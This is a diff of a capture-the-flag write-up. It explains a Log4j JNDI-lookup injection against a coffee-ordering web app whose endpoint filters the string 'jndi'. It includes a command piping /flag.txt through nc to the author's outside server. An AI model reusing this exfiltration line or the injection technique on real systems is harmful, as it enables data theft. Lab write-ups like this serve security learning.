@@ -26,7 +26,7 @@ Submitting our order simply displayed a receipt of our input. I decided to look 
 
 ![alt text](<images/Screenshot 2026-01-08 at 2.25.11 PM.png>)
 
-Within a CoffeeController.java file, I found the source code for the /order endpoint which we were accessing. The ID and quantity entered had to be decimals, but the comment could be a string. More interestingly, the endpoint denied a comment which contained "jndi". 
+Within a `CoffeeController.java` file, I found the source code for the `/order` endpoint which we were accessing. The ID and quantity entered had to be decimals, but the comment could be a string. More interestingly, the endpoint denied a comment which contained "jndi". 
 
 The Log4j logging library allows for lookups within log messages, allowing for more dynamic logs. For example, a log might need to include the user's home directory:
 
@@ -44,7 +44,7 @@ I was provided with an already configured LDAP server with jndiexploit, so I sim
 
 Like many CTFs, I assume that my goal is to locate and retrieve the contents of a flag.txt file. I couldn't simply use `cat` to read the text file because the application did not return anything besides what we typed out in the comment exactly.
 
-I needed the coffee application to reach out to me and give me the flag. To do this, I used nc to open up a port on my externally-accesible server and crafted a JNDI lookup that would read the flag.txt file and send the contents to me.
+I needed the coffee application to reach out to me and give me the flag. To do this, I used `nc` to open up a port on my externally-accesible server and crafted a JNDI lookup that would read the flag.txt file and send the contents to me.
 
 `cat /flag.txt | nc flip2.engr.oregonstate.edu 44444`
 
